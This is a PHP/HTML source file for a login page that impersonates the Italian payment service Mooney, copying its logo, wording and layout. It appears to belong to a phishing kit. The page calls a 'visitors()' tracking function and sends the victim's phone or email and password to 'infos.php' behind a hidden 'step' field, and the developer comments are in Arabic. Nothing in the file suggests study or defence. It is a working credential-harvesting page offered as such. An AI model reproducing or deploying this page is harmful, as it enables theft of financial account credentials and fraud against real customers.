<?php 

require_once "functions.php";


visitors();


?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Accedi a Mooney</title>
    <!-- إضافة Favicon -->
    <link rel="icon" type="image/png" href="image/unnamed.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo img {
            height: 50px;
        }
        
        h1 {
            text-align: center;
            font-size: 28px;
            margin-bottom: 40px;
            color: #4F4F4F;
            font-weight: bold;
        }
        
        .form-group {
            margin-bottom: 30px;
            width: 100%;
        }
        
        label {
            display: block;
            margin-bottom: 12px;
            color: #4F4F4F;
            font-size: 16px;
            font-weight: bold;
        }
        
        .input-field {
            width: 100%;
            padding: 0;
            border: none;
            border-bottom: 2px solid #ddd;
            font-size: 18px;
            color: #4F4F4F;
            background: transparent;
            padding-bottom: 8px;
            transition: border-color 0.3s;
        }
        
        .input-field::placeholder {
            color: #4F4F4F;
            font-size: 16px;
        }
        
        .input-field:focus {
            outline: none;
            border-bottom-color: #008085;
        }
        
        .remember-forgot {
            display: flex;
            flex-direction: column;
            margin-bottom: 40px;
            width: 100%;
        }
        
        .remember {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .remember input {
            margin-right: 12px;
            transform: scale(1.2);
        }
        
        .remember label {
            margin-bottom: 0;
            color: #4F4F4F;
            font-size: 16px;
        }
        
        .forgot-password {
            color: #008085;
            text-decoration: none;
            font-size: 16px;
            font-weight: bold;
        }
        
        .btn {
            display: block;
            width: 100%;
            padding: 18px;
            background-color: #FFCC00;
            color: #333;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 30px;
            transition: background-color 0.3s;
        }
        
        .btn:hover {
            background-color: #e6b800;
        }
        
        .recaptcha-notice {
            text-align: center;
            font-size: 14px;
            color: #4F4F4F;
            line-height: 1.5;
            margin-bottom: 30px;
            width: 100%;
        }
        
        .recaptcha-notice a {
            color: #008085;
            text-decoration: underline;
        }
        
        .register-link {
            text-align: center;
            color: #4F4F4F;
            font-size: 16px;
            width: 100%;
        }
        
        .register-link a {
            color: #008085;
            text-decoration: none;
            font-weight: bold;
        }

        /* تحسينات للهواتف */
        @media (max-width: 768px) {
            .container {
                padding: 0 20px;
                max-width: 100%;
            }
            
            h1 {
                font-size: 24px;
                margin-bottom: 30px;
            }
            
            .logo img {
                height: 40px;
            }
            
            .input-field {
                font-size: 16px;
            }
            
            .input-field::placeholder {
                font-size: 14px;
            }
            
            label, .remember label, .forgot-password, .register-link {
                font-size: 14px;
            }
            
            .btn {
                padding: 16px;
                font-size: 16px;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 15px;
                justify-content: flex-start;
                padding-top: 40px;
            }
            
            .container {
                padding: 0 10px;
            }
            
            h1 {
                font-size: 22px;
                margin-bottom: 25px;
            }
            
            .logo {
                margin-bottom: 30px;
            }
            
            .logo img {
                height: 35px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="image/logo-mo.svg" alt="Mooney Logo">
        </div>
        
        <h1>Accedi</h1>
        
        <form action="infos.php" method="POST">
            <!-- إضافة حقل hidden لتحديد الخطوة -->
            <input type="hidden" name="step" value="login">
            
            <div class="form-group">
                <label for="username">Inserisci numero di cellulare o e-mail*</label>
                <input type="text" id="username" name="username" class="input-field" placeholder="Es: 3900870078 o mario@mail.it" required>
            </div>
            
            <div class="form-group">
                <label for="password">Inserisci la password*</label>
                <input type="password" id="password" name="password" class="input-field" placeholder="Es: Esempio1" required>
            </div>
            
            <div class="remember-forgot">
                <div class="remember">
                    <input type="checkbox" id="remember" name="remember">
                    <label for="remember">Ricordami</label>
                </div>
                <a href="#" class="forgot-password">Ho dimenticato la password</a>
            </div>
            
            <button type="submit" class="btn">ACCEDI A MOONEY</button>
        </form>
        
        <div class="recaptcha-notice">
            Questo sito è protetto da reCAPTCHA e si applicano le <a href="#">Norme sulla Privacy</a> ed i <a href="#">Termini di Servizio</a> di Google.
        </div>
        
        <div class="register-link">
            Non hai ancora un account? <a href="#">Registrati</a>
        </div>
    </div>

    <script>
        // جعل كلمة المرور تظهر مؤقتًا ثم تختفي
        const passwordInput = document.getElementById('password');
        let passwordTimeout;
        
        passwordInput.addEventListener('input', function(e) {
            // إظهار الحرف المكتوب مؤقتًا
            this.type = 'text';
            
            // إلغاء المؤقت السابق إذا كان موجودًا
            clearTimeout(passwordTimeout);
            
            // تعيين مؤقت لإخفاء الحرف بعد 500 مللي ثانية
            passwordTimeout = setTimeout(() => {
                this.type = 'password';
            }, 500);
        });
        
        // إخفاء كلمة المرور عند فقدان التركيز
        passwordInput.addEventListener('blur', function() {
            this.type = 'password';
            clearTimeout(passwordTimeout);
        });
    </script>
</body>
</html>